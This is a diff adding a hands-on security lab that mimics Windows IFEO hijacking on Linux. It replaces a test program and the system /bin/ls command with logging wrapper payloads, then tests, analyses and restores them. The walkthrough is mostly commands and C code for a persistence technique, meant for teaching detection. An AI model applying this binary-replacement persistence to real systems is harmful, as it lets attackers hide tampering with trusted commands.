@@ -1,0 +1,205 @@
+ Apply IFEO Registry Hijack for Persistence
+Learning Objectives
+By completing this lab, you will:
+
+Understand IFEO (Image File Execution Options) registry hijacking techniques
+Implement IFEO-based persistence mechanisms on Linux systems
+Test and verify persistence execution methods
+Analyze registry-like persistence using Linux system files
+Prerequisites
+Basic Linux command line knowledge
+Understanding of process execution and system startup
+Familiarity with text editors (nano, vim)
+Knowledge of file permissions and system directories
+Lab Environment
+Al Nafi provides Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated Linux machine. The provided system is bare metal with no pre-installed tools, so you will install required tools during the lab exercises.
+
+Task 1: Modify System Files to Hijack Executable Loading
+Subtask 1.1: Install Required Tools
+# Update system packages
+sudo apt update
+
+# Install necessary tools
+sudo apt install -y gcc make strace procps
+
+# Verify installations
+which gcc strace ps
+Subtask 1.2: Create Target Executable
+# Create a simple target program
+cat > /tmp/target_app.c << 'EOF'
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+    printf("Original target application running...\n");
+    printf("PID: %d\n", getpid());
+    sleep(5);
+    printf("Target application finished.\n");
+    return 0;
+}
+EOF
+
+# Compile the target application
+gcc -o /tmp/target_app /tmp/target_app.c
+
+# Make it executable
+chmod +x /tmp/target_app
+Subtask 1.3: Create Hijack Payload
+# Create the hijacking payload
+cat > /tmp/hijack_payload.c << 'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+int main(int argc, char *argv[]) {
+    printf("[HIJACK] Persistence payload executed!\n");
+    printf("[HIJACK] Original command: %s\n", argv[0]);
+    printf("[HIJACK] PID: %d\n", getpid());
+    
+    // Log the hijack attempt
+    system("echo \"$(date): IFEO hijack executed\" >> /tmp/hijack_log.txt");
+    
+    // Execute original program if it exists
+    if (access("/tmp/target_app_original", F_OK) == 0) {
+        printf("[HIJACK] Executing original program...\n");
+        execv("/tmp/target_app_original", argv);
+    }
+    
+    return 0;
+}
+EOF
+
+# Compile the hijack payload
+gcc -o /tmp/hijack_payload /tmp/hijack_payload.c
+chmod +x /tmp/hijack_payload
+Subtask 1.4: Implement IFEO-Style Hijacking
+# Backup original executable
+cp /tmp/target_app /tmp/target_app_original
+
+# Replace target with hijack payload
+cp /tmp/hijack_payload /tmp/target_app
+
+# Verify the hijack is in place
+ls -la /tmp/target_app*
+Subtask 1.5: Create System-Wide Persistence
+# Create a system binary hijack (requires sudo)
+sudo cp /bin/ls /bin/ls_original
+
+# Create wrapper script for ls command
+cat > /tmp/ls_wrapper.sh << 'EOF'
+#!/bin/bash
+echo "$(date): ls command hijacked" >> /tmp/system_hijack_log.txt
+/bin/ls_original "$@"
+EOF
+
+chmod +x /tmp/ls_wrapper.sh
+sudo cp /tmp/ls_wrapper.sh /bin/ls
+Task 2: Test Persistence and Execution
+Subtask 2.1: Test Local Executable Hijack
+# Test the hijacked target application
+echo "Testing local executable hijack:"
+/tmp/target_app
+
+# Check hijack log
+echo "Checking hijack log:"
+cat /tmp/hijack_log.txt
+Subtask 2.2: Test System Command Hijack
+# Test the hijacked ls command
+echo "Testing system command hijack:"
+ls /tmp/
+
+# Check system hijack log
+echo "Checking system hijack log:"
+cat /tmp/system_hijack_log.txt
+Subtask 2.3: Verify Persistence Across Sessions
+# Create a script to test persistence
+cat > /tmp/test_persistence.sh << 'EOF'
+#!/bin/bash
+echo "=== Persistence Test ==="
+echo "Testing target_app hijack:"
+/tmp/target_app
+
+echo "Testing ls hijack:"
+ls /home/ > /dev/null
+
+echo "Checking logs:"
+echo "Hijack log entries:"
+wc -l /tmp/hijack_log.txt
+echo "System hijack log entries:"
+wc -l /tmp/system_hijack_log.txt
+EOF
+
+chmod +x /tmp/test_persistence.sh
+/tmp/test_persistence.sh
+Subtask 2.4: Monitor Process Execution
+# Monitor processes during hijack execution
+echo "Monitoring process execution:"
+
+# Run target in background and monitor
+/tmp/target_app &
+TARGET_PID=$!
+
+# Check process tree
+ps -ef | grep target_app
+ps -ef | grep hijack
+
+# Wait for completion
+wait $TARGET_PID
+Subtask 2.5: Analyze Hijack Effectiveness
+# Create analysis script
+cat > /tmp/analyze_hijack.sh << 'EOF'
+#!/bin/bash
+echo "=== IFEO Hijack Analysis ==="
+
+echo "1. File modifications:"
+ls -la /tmp/target_app* /bin/ls*
+
+echo "2. Log analysis:"
+echo "Total hijack attempts: $(wc -l < /tmp/hijack_log.txt 2>/dev/null || echo 0)"
+echo "System command hijacks: $(wc -l < /tmp/system_hijack_log.txt 2>/dev/null || echo 0)"
+
+echo "3. Process verification:"
+pgrep -f hijack || echo "No hijack processes currently running"
+
+echo "4. Persistence verification:"
+if [ -f /tmp/target_app ] && [ -f /bin/ls ]; then
+    echo "Hijacks are persistent and in place"
+else
+    echo "Some hijacks may have been removed"
+fi
+EOF
+
+chmod +x /tmp/analyze_hijack.sh
+/tmp/analyze_hijack.sh
+Cleanup and Restoration
+# Restore original files
+sudo cp /bin/ls_original /bin/ls
+sudo rm -f /bin/ls_original
+cp /tmp/target_app_original /tmp/target_app
+
+# Clean up temporary files
+rm -f /tmp/hijack_payload /tmp/ls_wrapper.sh
+rm -f /tmp/target_app.c /tmp/hijack_payload.c
+rm -f /tmp/test_persistence.sh /tmp/analyze_hijack.sh
+
+echo "System restored to original state"
+Verification Commands
+# Final verification
+echo "=== Final Verification ==="
+echo "Original target app restored:"
+/tmp/target_app
+
+echo "Original ls command restored:"
+ls /tmp/ | head -3
+
+echo "Logs preserved for analysis:"
+ls -la /tmp/*log.txt
+Conclusion
+In this lab, you successfully implemented IFEO-style registry hijacking techniques on a Linux system by:
+
+Creating executable hijacks that intercept program execution
+Implementing system-wide command hijacking for persistence
+Testing and verifying hijack effectiveness across different scenarios
+Analyzing the persistence mechanisms and their impact
+This technique demonstrates how attackers can maintain persistence by hijacking commonly used executables and system commands. Understanding these methods is crucial for cybersecurity professionals to detect and prevent such attacks in real-world environments. The hijacking approach shown here mimics Windows IFEO registry attacks but uses Linux file system manipulation to achieve similar persistence goals.
